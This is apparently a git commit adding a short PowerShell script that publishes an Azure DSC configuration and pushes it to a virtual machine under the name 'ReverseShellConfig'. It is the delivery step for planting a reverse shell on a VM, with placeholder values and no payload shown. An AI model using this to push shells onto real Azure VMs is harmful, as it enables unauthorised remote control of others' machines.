14ebcea985f4d0a1f920f494d5df260eb44af80b
nickpupp0 <nppuppo@gmail.com>
2020-04-29 16:41:33 -0400

    Add files via upload

---
+++ push_reverse_shell_config.ps1
@@ -0,0 +1,6 @@
+$resourceGroup = ' '
+$vmName = ' '
+$storageName = ' '
+
+Publish-AzVMDscConfiguration -ConfigurationPath <path to config file> -ResourceGroupName $resourceGroup -StorageAccountName $storageName -force
+Set-AzVMDscExtension -Version '2.80' -ResourceGroupName $resourceGroup -VMName $vmName -ArchiveStorageAccountName $storageName -ArchiveBlobName '<name your file>' -AutoUpdate -ConfigurationName 'ReverseShellConfig'
